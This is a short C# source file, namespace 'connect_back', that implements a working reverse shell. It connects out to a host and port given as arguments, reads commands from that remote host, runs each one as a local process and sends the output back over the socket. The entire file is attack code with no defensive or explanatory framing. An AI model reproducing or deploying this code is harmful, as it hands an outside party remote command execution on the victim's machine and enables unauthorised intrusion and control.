using System;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;
using System.Text;

namespace connect_back
{
	class MainClass
	{
		public static void Main (string[] args)
		{
			using (TcpClient client = new TcpClient (args [0], int.Parse (args [1]))) {
				using (Stream stream = client.GetStream ()) {
					using (StreamReader rdr = new StreamReader (stream)) {
						while (true) {				
							string cmd = rdr.ReadLine ();

							if (string.IsNullOrEmpty (cmd))
								break;

							if (string.IsNullOrWhiteSpace (cmd))
								continue;

							string filename = string.Empty;
							string arg = string.Empty;

							if (cmd.IndexOf (' ') > -1) { 
								filename = cmd.Substring (0, cmd.IndexOf (' '));
								arg = cmd.Substring (cmd.IndexOf (' '), cmd.Length - filename.Length);
							} else {
								filename = cmd;
							}
								
							try {
								Process prc = new Process ();
								prc.StartInfo = new ProcessStartInfo ();
								prc.StartInfo.FileName = filename;
								prc.StartInfo.Arguments = arg;
								prc.StartInfo.UseShellExecute = false;
								prc.StartInfo.RedirectStandardOutput = true;
								prc.Start ();
								prc.WaitForExit ();

								byte[] results = Encoding.ASCII.GetBytes (prc.StandardOutput.ReadToEnd ());
								stream.Write (results, 0, results.Length);
							} catch{
								string error = "Error running command " + cmd;
								byte[] errorBytes = Encoding.ASCII.GetBytes (error);
								stream.Write (errorBytes, 0, errorBytes.Length);
							}
						}
					}
				}
			}
		}
	}
}